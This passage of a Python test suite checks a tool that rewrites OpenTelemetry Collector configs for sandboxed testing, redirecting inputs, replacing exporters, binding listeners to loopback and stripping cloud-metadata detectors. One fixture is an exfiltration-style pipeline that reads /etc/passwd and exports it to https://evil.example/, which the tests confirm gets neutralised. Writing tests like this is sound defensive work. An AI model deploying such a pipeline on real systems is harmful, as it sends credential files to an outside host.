        service:
          pipelines:
            metrics:
              receivers: [kubeletstats]
              processors: [resourcedetection]
              exporters: [otlphttp]
        """
    )
    _, advisories = mutate_for_otlp_replay(
        src, "metrics", Path("/tmp/out"), 4318
    )
    r103 = [a for a in advisories if a.id == "R-103"]
    assert len(r103) == 1
    # Only detector was cloud-only → processor removed entirely.
    assert r103[0].details["trimmed"] == []
    assert r103[0].details["removed_processors"] == [
        {"processor": "resourcedetection", "removed_detectors": ["gcp"]}
    ]


# ---------------------------------------------------------------------------
# R-008: synthesized filelog/syslog operator-test branch
# ---------------------------------------------------------------------------


_FILELOG_SRC = """
receivers:
  filelog:
    include: [/etc/passwd]
    storage: file_storage
    operators:
      - type: regex_parser
        regex: '(?P<msg>.*)'
processors:
  transform/x:
    log_statements: []
exporters:
  otlphttp: {endpoint: https://evil.example/}
extensions:
  file_storage: {directory: /tmp}
service:
  extensions: [file_storage]
  pipelines:
    logs:
      receivers: [filelog]
      processors: [transform/x]
      exporters: [otlphttp]
"""


def test_operator_test_filelog_synthesizes_and_keeps_processors() -> None:
    out, advisories = mutate_for_operator_test(
        _FILELOG_SRC,
        signal_type="logs",
        output_path=Path("/run/ws/output.data"),
        fixture_path=Path("/run/ws/input.log"),
        syslog_port=None,
    )
    doc = _parse(out)
    fl = doc["receivers"]["filelog"]
    assert [p.replace("\\", "/") for p in fl["include"]] == ["/run/ws/input.log"]
    assert "storage" not in fl
    assert fl["operators"][0]["type"] == "regex_parser"
    assert doc["service"]["pipelines"]["logs"]["processors"] == ["transform/x"]
    assert list(doc["exporters"]) == [FILE_OUT_NAME]
    assert "extensions" not in doc or not doc["extensions"]
    assert "R-008" in _ids(advisories)


def test_operator_test_container_chain_advisory_names_seed_pod() -> None:
    """When the preserved filelog chain includes a `container` operator, the
    R-008 advisory must spell out the seed-pod identity the staged path
    encodes, so agents/users know what add_metadata_from_filepath derives."""
    src = _FILELOG_SRC.replace(
        "- type: regex_parser\n        regex: '(?P<msg>.*)'",
        "- type: container\n        add_metadata_from_filepath: true",
    )
    _, advisories = mutate_for_operator_test(
        src,
        signal_type="logs",
        output_path=Path("/run/ws/output.data"),
        fixture_path=Path(
            "/run/ws/var/log/pods/demo_telflo-test-pod_cccccccc-cccc-cccc-cccc-cccccccccccc/app/0.log"
        ),
        syslog_port=None,
    )
    r008 = [a for a in advisories if a.id == "R-008"]
    assert len(r008) == 1
    assert "telflo-test-pod" in r008[0].message
    assert "add_metadata_from_filepath" in r008[0].message
    # The plain chain keeps the original, shorter advisory.
    _, plain_advisories = mutate_for_operator_test(
        _FILELOG_SRC,
        signal_type="logs",
        output_path=Path("/run/ws/output.data"),
        fixture_path=Path("/run/ws/input.log"),
        syslog_port=None,
    )
    plain_r008 = [a for a in plain_advisories if a.id == "R-008"]
    assert "telflo-test-pod" not in plain_r008[0].message


def test_operator_test_strips_cloud_detectors() -> None:
    """The operator-test path must strip cloud-metadata detectors (R-103)
    just like the OTLP path, so a filelog logs pipeline with a
    resourcedetection processor doesn't re-open the cloud-metadata
    side-channel. Mirrors test_r103_trims_cloud_detectors_when_others_remain."""
    src = dedent(
        """
        receivers:
          filelog:
            include: [/etc/passwd]
        processors:
          resourcedetection:
            detectors: [env, gcp]
        exporters: {otlphttp: {}}
        service:
          pipelines:
            logs:
              receivers: [filelog]
              processors: [resourcedetection]
              exporters: [otlphttp]
        """
    )
    out, advisories = mutate_for_operator_test(
        src,
        "logs",
        Path("/run/ws/output.data"),
        fixture_path=Path("/run/ws/input.log"),
        syslog_port=None,
    )
    doc = _parse(out)

    assert "resourcedetection" in doc["processors"]
    assert doc["processors"]["resourcedetection"]["detectors"] == ["env"]
    assert doc["service"]["pipelines"]["logs"]["processors"] == [
        "resourcedetection"
    ]
    assert "R-103" in _ids(advisories)
    r103 = [a for a in advisories if a.id == "R-103"]
    assert r103[0].severity == "warn"
    assert r103[0].details["trimmed"] == [
        {"processor": "resourcedetection", "removed_detectors": ["gcp"]}
    ]
    assert r103[0].details["removed_processors"] == []


def test_operator_test_syslog_synthesizes_loopback_listener() -> None:
    src = _FILELOG_SRC.replace(
        "filelog:\n    include: [/etc/passwd]\n    storage: file_storage",
        "syslog:\n    tcp: {listen_address: 0.0.0.0:514}\n    protocol: rfc3164",
    ).replace("receivers: [filelog]", "receivers: [syslog]")
    out, advisories = mutate_for_operator_test(
        src,
        signal_type="logs",
        output_path=Path("/run/ws/output.data"),
        fixture_path=None,
        syslog_port=39999,
    )
    doc = _parse(out)
    sl = doc["receivers"]["syslog"]
    assert sl["tcp"] == {"listen_address": "127.0.0.1:39999"}
    assert sl["protocol"] == "rfc3164"
    assert "R-008" in _ids(advisories)


# Two filelog receivers, the plain one defined first. Which receiver gets
# synthesized must follow the user's pipeline selection, not YAML
# definition order — otherwise the selected pipeline silently runs the
# other receiver's operator chain.
_TWO_FILELOG_SRC = """
receivers:
  filelog/2:
    include: [/var/log/simple.log]
    operators:
      - {type: json_parser, parse_to: attributes, parse_from: body}
  filelog:
    include: [/var/log/app.log]
    operators:
      - {type: json_parser, parse_to: attributes, parse_from: body}
      - {type: flatten, field: attributes.exception}
service:
  pipelines:
    logs:               {receivers: [filelog],   exporters: [debug]}
    logs/withoutRedact: {receivers: [filelog/2], exporters: [debug]}
"""


def test_operator_test_synthesizes_the_target_pipelines_receiver() -> None:
    out, _ = mutate_for_operator_test(
        _TWO_FILELOG_SRC,
        signal_type="logs",
        output_path=Path("/run/ws/output.data"),
        fixture_path=Path("/run/ws/input.log"),
        syslog_port=None,
        target_pipeline="logs",
    )
    doc = _parse(out)
    assert list(doc["receivers"]) == ["filelog"]
    ops = [o["type"] for o in doc["receivers"]["filelog"]["operators"]]
    assert "flatten" in ops
    assert doc["service"]["pipelines"]["logs"]["receivers"] == ["filelog"]


def test_operator_test_target_pipeline_picks_plain_sibling_receiver() -> None:
    # Selecting the sibling must synthesize ITS receiver (no flatten).
    out, _ = mutate_for_operator_test(
        _TWO_FILELOG_SRC,
        signal_type="logs",
        output_path=Path("/run/ws/output.data"),
        fixture_path=Path("/run/ws/input.log"),
        syslog_port=None,
        target_pipeline="logs/withoutRedact",
    )
    doc = _parse(out)
    assert list(doc["receivers"]) == ["filelog/2"]
    ops = [o["type"] for o in doc["receivers"]["filelog/2"]["operators"]]
    assert "flatten" not in ops
    pipes = doc["service"]["pipelines"]
    assert pipes["logs/withoutRedact"]["receivers"] == ["filelog/2"]
